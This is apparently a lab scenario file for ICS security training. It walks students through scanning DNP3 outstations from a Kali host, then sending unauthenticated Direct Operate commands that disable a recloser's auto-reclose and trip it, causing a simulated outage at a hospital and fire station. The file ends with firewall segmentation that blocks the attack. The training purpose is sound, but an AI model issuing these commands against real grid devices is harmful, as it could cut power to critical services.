@@ -1,0 +1,180 @@
+id: dnp3-command-injection
+order: 4
+name: "DNP3 Direct Operate Command Injection"
+summary: "DNP3 Direct Operate from Kali disables recloser auto-reclose, causing a permanent outage on fault."
+description: >
+  An attacker on the enterprise network exploits unauthenticated
+  DNP3 TCP to send Direct Operate commands to field devices,
+  disabling the recloser's auto-reclose function. Without
+  auto-reclose, a transient fault causes a permanent outage
+  affecting the hospital and fire station. Students must apply
+  containd segmentation to block enterprise→field DNP3 access
+  on port 20000.
+nodes:
+  - kali-1
+tags:
+  - dnp3
+  - field-device
+  - offense
+  - segmentation
+steps:
+  - title: "Verify normal operations"
+    description: >
+      Confirm all field devices are online and communicating through
+      the RTAC. The recloser should be closed with auto-reclose
+      enabled. All loads should be energized.
+
+      Use dnp3poll from the RTAC or any OT host to verify:
+
+        dnp3poll 10.40.40.21:20000 -a 2
+
+      Binary Output [0] (closed) should be ON, Binary Output [1]
+      (reclose_enabled) should be ON.
+    action:
+      type: check
+      expect:
+        breaker_closed: true
+        recloser_closed: true
+        reclose_enabled: true
+
+  - title: "Reconnaissance — scan for DNP3 outstations"
+    description: >
+      From the Kali attacker box (10.10.10.50), scan the field
+      device network for DNP3 TCP outstations:
+
+        nmap -p 20000 10.40.40.20-23
+
+      Under the weak firewall config, enterprise→field traffic
+      on port 20000 is allowed. You should see all field devices
+      with port 20000 open.
+
+      Poll each outstation to enumerate its points:
+
+        dnp3poll 10.40.40.20:20000 -a 1
+        dnp3poll 10.40.40.21:20000 -a 2
+        dnp3poll 10.40.40.22:20000 -a 3
+
+  - title: "DNP3 Direct Operate — disable auto-reclose"
+    description: >
+      From Kali, send a DNP3 Direct Operate command to the recloser
+      (outstation addr 2) to disable auto-reclose. Use dnp3cmd to
+      send a CROB Latch Off to binary output index 1:
+
+        dnp3cmd 10.40.40.21:20000 -a 2 crob 1 latch-off
+
+      The recloser's auto-reclose is now disabled. Verify via DNP3:
+
+        dnp3poll 10.40.40.21:20000 -a 2
+
+      Or check via REST:
+
+        curl -s http://10.40.40.21:8080/api/state | python3 -m json.tool
+
+      Binary Output [1] / reclose_enabled should now be OFF/false.
+    action:
+      type: command
+      device: recloser
+      command: disable_reclose
+      source: "10.10.10.50"
+
+  - title: "Inject fault — observe permanent outage"
+    description: >
+      Inject a transient fault on the recloser. Normally,
+      auto-reclose would restore power after the fault clears.
+      With auto-reclose disabled by the attacker, the recloser
+      trips and locks out — downstream loads lose power permanently.
+
+      From Kali, trip the recloser via DNP3:
+
+        dnp3cmd 10.40.40.21:20000 -a 2 crob 0 trip
+
+      Or via REST:
+
+        curl -X POST http://10.40.40.21:8080/api/command \
+          -d '{"command":"inject_fault","source":"10.10.10.50"}'
+    action:
+      type: command
+      device: recloser
+      command: inject_fault
+      source: "scenario-script"
+
+  - title: "Observe impact"
+    description: >
+      The recloser is open and locked out. Critical and general
+      loads downstream of the recloser are without power.
+      Hospital and fire station are affected.
+
+      Verify from Kali:
+
+        dnp3poll 10.40.40.21:20000 -a 2
+
+      Binary Input [0] (lockout) = ON, Binary Output [0] (closed) = OFF,
+      Binary Output [1] (reclose_enabled) = OFF.
+
+      Also check the RTAC for the full picture:
+
+        dnp3poll 10.30.30.20:20000 -a 10
+    action:
+      type: check
+      expect:
+        reclose_enabled: false
+
+  - title: "Restore operations"
+    description: >
+      Use the RangerDanger HMI Supervisory Control tab to restore
+      the feeder: clear fault, re-enable auto-reclose, reset
+      lockout, and close the recloser.
+    action:
+      type: sequence
+      commands:
+        - device: recloser
+          command: clear_fault
+          source: "operator"
+        - device: recloser
+          command: enable_reclose
+          source: "operator"
+        - device: recloser
+          command: reset_lockout
+          source: "operator"
+        - device: recloser
+          command: close
+          source: "operator"
+
+  - title: "Apply containd segmentation"
+    description: >
+      Apply the improved firewall configuration via the containd
+      Segmentation tab. This blocks enterprise, vendor, and all
+      non-RTAC OT nodes from reaching field device DNP3 outstations
+      on port 20000. Only the RTAC (10.40.40.10) is allowed.
+    action:
+      type: firewall
+      config: improved
+
+  - title: "Re-test DNP3 attack"
+    description: >
+      From Kali, re-attempt the DNP3 attack:
+
+        dnp3cmd 10.40.40.21:20000 -a 2 crob 1 latch-off
+
+      The connection should time out — containd blocks enterprise→field
+      on port 20000. Verify auto-reclose is still enabled:
+
+        dnp3poll 10.40.40.21:20000 -a 2
+
+      This should also time out (blocked). Check via the HMI instead.
+    action:
+      type: command
+      device: recloser
+      command: disable_reclose
+      source: "10.10.10.50"
+
+  - title: "Validate segmentation"
+    description: >
+      Verify auto-reclose is still enabled, all loads are
+      energized, and the hardened firewall policy is active.
+      The DNP3 attack path from enterprise→field is now blocked.
+    action:
+      type: check
+      expect:
+        reclose_enabled: true
+        firewall_config: improved
